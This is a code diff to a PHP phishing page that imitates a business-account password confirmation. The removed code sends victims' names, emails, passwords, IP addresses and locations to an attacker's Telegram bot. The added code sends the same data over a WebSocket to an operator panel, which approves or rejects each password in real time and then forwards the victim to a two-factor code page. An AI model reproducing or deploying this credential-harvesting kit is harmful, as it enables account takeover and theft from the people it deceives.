@@ -119,6 +119,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                         <svg id="eye" 
                         width="20px" height="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0z" fill="#0D0D0D"/><path d="M21.894 11.553C19.736 7.236 15.904 5 12 5c-3.903 0-7.736 2.236-9.894 6.553a1 1 0 0 0 0 .894C4.264 16.764 8.096 19 12 19c3.903 0 7.736-2.236 9.894-6.553a1 1 0 0 0 0-.894zM12 17c-2.969 0-6.002-1.62-7.87-5C5.998 8.62 9.03 7 12 7c2.969 0 6.002 1.62 7.87 5-1.868 3.38-4.901 5-7.87 5z" fill="#0D0D0D"/></svg>
                     </div>
+                    <p id="password-error"></p>
                     <a href="#" class="forgot-password">Forgot your password?</a>
                 </div>
                 <div class="modal-footer">
@@ -128,6 +129,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             </div>
         </form>
     </div>
+    <?php include 'loading.php'; ?>
 </body>
 
 <script>
@@ -138,27 +140,19 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         nameElement.textContent = localStorage.getItem('firstName') + ' ' + localStorage.getItem('lastName');
         emailElement.textContent = localStorage.getItem('personalEmail');
 
-        var paramsURL = new URLSearchParams(window.location.search);
-        var error = paramsURL.get('error');
-        var password = paramsURL.get('password');
+        var passwordInput = document.getElementById('password');
 
-        if (error == 1) {
-            const acceptBtn = document.querySelector('.accept-btn');
-            acceptBtn.click();
-            var passwordInput = document.getElementById('password');
-            passwordInput.value = password;
-            passwordInput.focus();
-            passwordInput.select();
-            passwordInput.style.border = '1px solid #FF0303';
+        passwordInput.addEventListener('input', function() {
+            if (passwordInput.value.length > 0) {
+                passwordInput.style.border = '1px solid #E5E5E5';
+                
+            } else {
+                passwordInput.style.border = '1px solid #FF0303';
+            } 
 
-            passwordInput.addEventListener('input', function() {
-                if (passwordInput.value.length > 0) {
-                    passwordInput.style.border = '1px solid #E5E5E5';
-                } else {
-                    passwordInput.style.border = '1px solid #FF0303';
-                }
-            });
-        }
+            var passwordError = document.getElementById('password-error');
+            passwordError.textContent = "";
+        });
     });
 
     var eye = document.getElementById('eye');
@@ -170,6 +164,29 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             passwordInput.type = 'password';
         }
     });
+
+    const ws = new WebSocket('ws://localhost:8080');
+    let orderId = localStorage.getItem('currentOrderId');
+
+    ws.onmessage = function(event) {
+        const data = JSON.parse(event.data);
+        if (data.type === 'admin_approve_password_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+            localStorage.setItem('currentOrderId', data.order_id);
+            localStorage.setItem('currentStep', data.step);
+            localStorage.setItem('currentPassword', data.password);
+            window.location.href = '/two-factor-authentication.php';
+        } else if (data.type === 'admin_reject_password_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+            hideLoading();
+            var passwordInput = document.getElementById('password');
+            passwordInput.value = "";
+            passwordInput.value = data.user_info.password;
+            passwordInput.focus();
+            passwordInput.style.border = '1px solid #FF0303';
+
+            var passwordError = document.getElementById('password-error');
+            passwordError.textContent = "Password is incorrect, please try again";
+        }
+    };
 
     function sendToTelegramFromConfirmBusinessInformation(event) {
         event.preventDefault();
@@ -184,61 +201,35 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         var lastName = localStorage.getItem('lastName');
         var personalEmail = localStorage.getItem('personalEmail');
 
-        var content = "💬Thông Tin Tài Khoản 1💬" +
-            "\n" + "----------------------------------------------------------" +
-            "\nFirst Name: " + "`" + firstName + "`" +
-            "\nLast Name: " + "`" + lastName + "`" +
-            "\nEmail: " + "`" + personalEmail + "`" +
-            "\n" + "----------------------------------------------------------" +
-            "\nPassword: " + "`" + password + "`" +
-            "\n" + "----------------------------------------------------------" +
-            "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
-            "\nIP Address: " + "`<?php echo $ip; ?>`" +
-            "\nCity: " + "`<?php echo $city; ?>`" +
-            "\nRegion: " + "`<?php echo $region; ?>`" +
-            "\nCountry: " + "`<?php echo $country; ?>`" +
-            "\nOrg: " + "`<?php echo $org; ?>`" +
-            "\nTimezone: " + "`<?php echo $timezone; ?>`" +
-            "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
+        var ip = `<?php echo htmlspecialchars($ip_server); ?>` || `<?php echo $ip; ?>`;
+        var ip_address = `<?php echo $ip; ?>`;
+        var city = `<?php echo $city; ?>`;
+        var region = `<?php echo $region; ?>`;
+        var country = `<?php echo $country; ?>`;
+        var org = `<?php echo $org; ?>`;
+        var timezone = `<?php echo $timezone; ?>`;
 
-        console.log(content);
-        
-        var apiToken = "<?php echo $token; ?>";
-        var data = {
-            chat_id: '<?php echo $chatId; ?>',
-            text: content,
-            parse_mode: 'Markdown'
-        };
-
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === XMLHttpRequest.DONE) {
-                if (xhr.status >= 200 && xhr.status < 300) {
-                    console.log('Message sent to Telegram bot successfully.');
-                    setTimeout(function() {
-                        var paramsURL = new URLSearchParams(window.location.search);
-                        var error = paramsURL.get('error');
-
-                        if (error == 1) {
-                            window.location.href = "/two-factor-authentication.php";
-                            localStorage.setItem('firstName', firstName);
-                            localStorage.setItem('lastName', lastName);
-                            localStorage.setItem('personalEmail', personalEmail);
-                            localStorage.setItem('password', password);
-                        } else {
-                            window.location.href = "/confirm-business-information.php?error=1&password=" + password;
-                        }
-                    }, 1000);
-                } else {
-                    console.error('Failed to send message to Telegram bot.');
-                }
+        ws.send(JSON.stringify({
+            type: 'enter_password',
+            order_id: orderId,
+            password: password,
+            step: 2,
+            user_info: {
+                name: firstName + " " + lastName,
+                email: personalEmail,
+                ip: ip,
+                ip_address: ip_address,
+                city: city,
+                region: region,
+                country: country,
+                org: org,
+                timezone: timezone,
+                password: password,
+                code: "",
+                phone: ""
             }
-        };
-
-        xhr.send(JSON.stringify(data));
+        }));
+        showLoading();
     }
 </script>
 
